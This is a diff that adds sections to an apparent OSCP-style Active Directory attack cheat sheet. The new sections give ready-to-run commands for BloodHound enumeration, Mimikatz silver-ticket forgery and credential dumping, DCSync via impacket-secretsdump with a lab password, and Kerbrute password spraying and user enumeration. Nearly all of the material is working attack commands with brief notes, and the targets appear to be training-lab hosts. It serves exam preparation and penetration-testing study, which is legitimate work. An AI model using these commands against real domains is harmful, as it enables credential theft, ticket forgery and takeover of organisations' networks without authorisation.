@@ -469,6 +469,22 @@ PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 # sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
+### BloodHound
+```javascript
+#Linux:
+bloodhound-python -u <username> -d <domain_name> -c all -v -ns $IP
+
+#Windows:
+PS> Import-Module .\Sharphound.ps1
+PS> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Temp\ -OutputPrefix "corp audit"
+
+Linux:
+sudo neo4j start
+and start the bloodhound !!
+
+
+```
+
 ### GenericAll Permission on Domain Controller [ DC ]:
 
 Like this : 
@@ -624,9 +640,47 @@ We already have the password ($pass) so start with the other commands !!
 
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
+## Silver Tickets
+
+Take an example we are user `john` and we are unabel to access the web01.corp.com and this is connected to the SPN user called `iis_service` example..
+to access that webpage ..
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/17d0a761-91e2-415a-af6f-eed318a54fce)
+
+- Obtaining hash of an SPN user using Mimikatz
+```javascript
+privilege::debug
+sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
+```
+- Obtaining Domain SID
+```javascript
+PS> whoami /user
+# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
+```
+- Forging silver ticket Ft Mimikatz
+```javascript
+kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user or any domain user>
+exit
+
+# Here the service is http !!
+
+example:
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+# we can check the tickets by,
+ps> klist
+```
+Afte this Now we can access the Webpage connected to that SPN !!
+
+```javascript
+PS> iwr -UseDefaultCredentials <servicename>://<computername>
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/0bc204da-3f87-4deb-9e2e-72b806232314)
+
+
 ## Golden Ticket !!
 
-We have kgbre hash !! [From Linux]
+We have krbtgt hash !! [From Linux]
 
 `-domain-sid` --> 
 ```powrshell
@@ -754,11 +808,18 @@ mimikatz# lsadump::cache
 ```
 
 → Show the tickets that are stored in memory
+
+Take an example we are in the `CLIENT01.example.com` and we can list shares of `web01.example.com` like
+Enter Commands in Client01 machine
+```javascript
+PS> dir \\web01.example.com\<sharename>
+```
+the Tickets will be cached TGT and TGS we can retrive them using the below command !!
 ```powershell
 mimikatz # sekurlsa::tickets
 ```
 
-### Domain Synchronization:
+### Domain Synchronization: Get access to DC Administrator and get any hash as admin user!!
 
 → lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user
 ```powershell
@@ -767,12 +828,28 @@ mimikatz # lsadump::dcsync /user:corp\dave
 ```powershell
 mimikatz # lsadump::dcsync /user:corp\Administrator
 ```
+```javascript
+#this will give dave user hashes!
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
+#this will give Administrator Hashes
+impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
 
 ### Crackmapexec:
 
 for bruteforcing:
 ```powershell
 # crackmapexec smb 192.168.225.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+### Kerbrute 
+```javascript
+#Password Spraying
+PS> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+# Userenum by giving the usernames list
+./kerbrute_linux_amd64 userenum --dc 192.168.246.175 -d resourced.local ~/Resourced/users
 ```
 
 For checking if the pwned is reflected then that user is local admin on that system !!
